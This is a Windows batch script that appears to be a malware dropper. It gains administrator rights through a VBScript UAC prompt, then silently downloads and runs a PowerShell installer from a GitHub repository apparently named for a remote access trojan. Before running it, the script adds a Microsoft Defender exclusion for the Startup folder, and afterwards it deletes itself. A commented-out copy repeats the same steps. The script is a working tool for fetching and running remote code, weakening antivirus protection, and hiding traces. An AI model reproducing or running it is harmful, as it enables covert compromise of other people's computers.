@echo off

:: BatchGotAdmin
:-------------------------------------
REM  --> Check for permissions
    IF "%PROCESSOR_ARCHITECTURE%" EQU "amd64" (
>nul 2>&1 "%SYSTEMROOT%\SysWOW64\cacls.exe" "%SYSTEMROOT%\SysWOW64\config\system"
) ELSE (
>nul 2>&1 "%SYSTEMROOT%\system32\cacls.exe" "%SYSTEMROOT%\system32\config\system"
)

REM --> If error flag set, we do not have admin.
if '%errorlevel%' NEQ '0' (
    echo Requesting administrative privileges...
    goto UACPrompt
) else ( goto gotAdmin )

:UACPrompt
    echo Set UAC = CreateObject^("Shell.Application"^) > "%temp%\getadmin.vbs"
    set params= %*
    echo UAC.ShellExecute "cmd.exe", "/c ""%~s0"" %params:"=""%", "", "runas", 1 >> "%temp%\getadmin.vbs"

    "%temp%\getadmin.vbs"
    del "%temp%\getadmin.vbs"
    exit /B

:gotAdmin
    pushd "%CD%"
    CD /D "%~dp0"
:--------------------------------------   

@REM REM disable defender and execute downloaded script
@REM powershell -windowstyle hidden -Command ^
@REM "try { ^
@REM     Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/CHEPHYTY/MK1-Ratatouille/main/files/installer.ps1' -OutFile 'installer.ps1'; ^
@REM     Add-MpPreference -ExclusionPath '$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup'; ^
@REM     .\installer.ps1; ^
@REM } catch { ^
@REM     Write-Error 'An error occurred: ' + $_.Exception.Message; ^
@REM }"


@REM powershell Add-MpPreference -ExclusionPath '$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup'; ./installer.ps1
@REM REM self delete
@REM del "%~f0"


REM disable defender and execute downloaded script
powershell -windowstyle hidden -c ^
"try { ^
    Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/CHEPHYTY/MK1-Ratatouille/main/files/installer.ps1' -OutFile 'installer.ps1'; ^
    Add-MpPreference -ExclusionPath '$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup'; ^
    .\installer.ps1; ^
} catch { ^
    Write-Error 'An error occurred: ' + $_.Exception.Message; ^
}"

REM self delete
del "%~f0"